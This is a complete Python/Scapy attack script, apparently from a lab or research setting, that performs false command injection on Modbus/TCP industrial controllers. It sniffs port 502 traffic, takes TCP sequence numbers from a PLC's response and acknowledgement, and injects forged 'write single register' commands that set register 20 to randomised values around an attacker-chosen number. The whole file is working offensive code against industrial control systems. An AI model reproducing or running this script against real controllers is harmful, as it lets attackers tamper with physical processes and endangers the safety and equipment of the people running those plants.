from scapy.all import *
from scapy.layers.inet import *

from random import randint
import time
import argparse


class ModbusTCP(Packet):

    name = 'Modbus/TCP'

    fields_desc = [
                    ShortField('transaction_id', 0),
                    ShortField('protocol_id', 0),
                    ShortField('length', 0),                               #da vedere
                    ByteField('unit_id', 0)
                   ]

class Modbus(Packet):

    name = 'Modbus'
    
    fields_desc = [
                    XByteField('function_code', 0),
                    ShortField('reference_number', 0),
                    ShortField('data', 0)
                   ]


def attack():

    modbus_string = "x00\\x00\\x00\\x06\\x02\\x06\\x00\\x14"
    n_packets = 6
    n_captures = 0
    n_injected = 0

    while True:
        # cattura un tcp ack diretto verso il plc
                
        n_captures = n_captures+1

        print(" capture #" + str(n_captures), end='\r')
        pkt_list = sniff(iface="eth2", filter="tcp port 502", count=n_packets)
        
        try: 
            output = [index for index, packet in enumerate(pkt_list) if packet[IP].dst==target and modbus_string in str(packet[Raw].load)]
        except:
            output = []

        if len(output)>0:                                       # se nel gruppo di pacchetti sono state identificate modbus response
            mb_index = output[len(output)-1]

            if mb_index < n_packets-2:                          # e se è stato identificato anche l'ACK TCP alla modbus response
            
                n_injected = n_injected+1

                mb = pkt_list[mb_index]
                ack = pkt_list[mb_index+2]

                print()
                print("     modbus response and ack tcp identified, packet forgery")

                tcpdata = {
                'src': ack[IP].src,
                'dst': ack[IP].dst,
                'sport': ack[TCP].sport,
                'dport': ack[TCP].dport,
                'seq': ack[TCP].seq,
                'ack': ack[TCP].ack,
                'wnd': ack[TCP].window,
                }

                payload = IP(src=tcpdata['src'], dst=tcpdata['dst']) / \
                            TCP(sport=tcpdata['sport'], dport=tcpdata['dport'], \
                            flags="PA", window=tcpdata['wnd'], seq=tcpdata['seq'], ack=tcpdata['ack'])            
                payload = payload/ModbusTCP(transaction_id=2023, protocol_id=0, length=6, unit_id=2)/ \
                            Modbus(function_code=6, reference_number=20, data=round(randint(value-5000, value+5000),-3))

                print("     packet injection #" + str(n_injected))
                send(payload, verbose=0, iface="eth1")
                print("     done")

                time.sleep(2)


if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument('--target', type=str, required=True)
    parser.add_argument('--value', type=int, required=True)
    args = parser.parse_args()

    target = args.target
    value = args.value

    print()
    print("        _____  ______ ___    _____ _____")
    print("       / ___/ / ____//   |  / ___// ___/")
    print("       \__ \ / /    / /| |  \__ \ \__ \ ")
    print("      ___/ // /___ / ___ | ___/ /___/ / ")
    print("     /____/ \__ __/_/  |_|/____//____/  ")
    print("                                        ")
    print("       False Command Injection example  ")
    print()

    print(" target: " + target)
    print(" value: " + str(value))
    print()

    attack()